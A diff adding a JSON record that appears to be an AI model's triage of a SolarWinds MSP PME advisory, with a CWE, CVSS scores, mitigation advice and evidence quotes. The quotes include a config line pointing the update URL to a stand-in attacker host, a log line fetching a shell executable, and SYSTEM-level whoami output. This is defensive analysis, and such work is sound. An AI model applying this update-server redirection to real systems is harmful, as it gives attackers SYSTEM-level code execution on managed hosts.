@@ -1,0 +1,77 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "SolarWinds MSP Patch Management Engine (PME) Cache Service before 1.1.15 allows local users to modify %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\config\\CacheService.xml due to insecure file permissions; an attacker can change SISServerURL to point to an attacker-controlled server hosting malicious component XML and executable, which the service downloads and the RPC Server later executes as SYSTEM, resulting in remote code execution.",
+    "affected_product": "SolarWinds MSP PME (Patch Management Engine) before 1.1.15",
+    "cwe": "CWE-276",
+    "cwe_quote": "The XML file CacheService.xml in %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\config\\ is writable by normal users, so that the parameter SISServerURL can be changed, which controls the location of the updates.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "After restarting the system or reloading the CacheService.xml, the service connects to the web server controlled by the attacker and downloads the executable file."
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "L",
+        "quote": "Any user on the system who is in group users can change the file content."
+      },
+      "UI": {
+        "value": "N",
+        "quote": "After restarting the system or reloading the CacheService.xml, the service connects to the web server controlled by the attacker and downloads the executable file."
+      },
+      "S": {
+        "value": "C",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "C": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "I": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "A": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      }
+    },
+    "recommended_next_step": "Verify presence of the updated PME (>= 1.1.15) on affected hosts; if not available, restrict NTFS permissions on CacheService.xml to prevent write by non-admin users and monitor for unexpected outbound connections and newly written executables under ProgramData\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\cache and PME\\archives.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "File is writable by normal users",
+        "quote": "The XML file CacheService.xml in %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\config\\ is writable by normal users, so that the parameter SISServerURL can be changed, which controls the location of the updates."
+      },
+      {
+        "claim": "Demonstrates changing SISServerURL to attacker server",
+        "quote": "<SISServerURL>https://evil-attacker.example.org</SISServerURL>"
+      },
+      {
+        "claim": "Exploit downloads malicious executable from attacker server",
+        "quote": "[24/Apr/2020:10:57:01 +0200] \"GET /ComponentData/RMM/1/solarwinds-shell.exe HTTP/1.1\" 200 7585 \"-\" \"-\""
+      },
+      {
+        "claim": "Service executes the downloaded executable as SYSTEM",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      {
+        "claim": "Proof of SYSTEM level shell",
+        "quote": "whoami\nwhoami\nnt-authority\\system"
+      },
+      {
+        "claim": "Local users can change file (icacls output)",
+        "quote": ".\\CacheService.xml VORDEFINIERT\\Benutzer:(I)(M)\nNT-AUTORIT\u00c4T\\SYSTEM:(I)(F)\nVORDEFINIERT\\Administratoren:(I)(F)"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 3349,
+    "output_tokens": 1029,
+    "latency_s": null,
+    "batch": true
+  }
+}
